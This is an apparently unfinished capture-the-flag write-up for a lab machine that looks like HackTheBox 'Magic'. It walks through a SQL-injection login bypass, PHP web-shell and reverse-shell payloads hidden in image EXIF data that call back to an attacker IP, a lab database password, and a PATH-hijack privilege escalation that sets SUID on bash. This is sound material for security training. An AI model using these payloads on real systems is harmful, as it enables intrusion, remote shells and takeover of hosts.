#InProgress 
```IP
10.10.10.185
```
# Enumeration

As always I start with nmap:
```
sudo nmap -sCV 10.10.10.185 -vvv -p- -oN enum/full
```
## HTTP 80
Apache httpd 2.4.29 ((Ubuntu))
There is a login page
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227100201.png?raw=true)
When submitting a single quote it does not prompt any alert:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227100140.png?raw=true)
It seems like we have a SQLi vulnerability. Let's exploit it.
# Exploitation
If we intercept the request we can bypass the login:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227102100.png?raw=true)
Download an example image and modify it with exiftool as follows:
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```
```
exiftool -Comment='<?php $sock=fsockopen("10.10.14.13",4444);passthru("sh <&3 >&3 2>&3"); ?>' lo.jpg
```

Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file
```
mv lo.jpg lo.php.jpg
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227105025.png?raw=true)
We have RCE.
After some trial and error, if we upload a php reverse shell our listener will get a estable shell:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227112332.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227112532.png?raw=true)

# PrivEsc

## Manual
It seems like we have another user `theseus` whose flag we can't read:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227112816.png?raw=true)

There seems to be sql database. We can find credentials inside the following file `/var/www/Magic/db.php5`:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227114315.png?raw=true)
There is a local port where mysql seems to be executing. Let's use ligolo to port forward to it:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227114731.png?raw=true)
In our local machine we will execute the following commands:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227114836.png?raw=true)
And in another terminal:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227114851.png?raw=true)
And in the target machine we will wget the ligolo-proxy and connect:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227114921.png?raw=true)
we can now connect to the database with the following command:
```
mysql -h 240.0.0.1 -P 3306 -u theseus -p Magic --password='iamkingtheseus' --ssl=FALSE
```
Where we can get credentials:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227122604.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227122700.png?raw=true)
If we run linpeas again we will find a SUID marked binary which we can now execute since we are in the users group now
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227125356.png?raw=true)
Analyzing the binary with `ltrace` we find that it calls fdisk without specifying the full path.
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227125249.png?raw=true)
So let's export our current directory to PATH and create there a malicious `fdisk`file, giving it execute permissions too:
```
export PATH=$(pwd):$PATH
```
```
echo '#!/bin/bash' > fdisk
```
```
echo 'chmod u+s /bin/bash' >> fdisk
```
```
chmod +x fdisk
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227130012.png?raw=true)

After executing it again we get SUID bash, which we can exploit with:
```
bash -p
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241227130220.png?raw=true)




## Automated

### Peass

### Mimikatz

# Lateral Movement
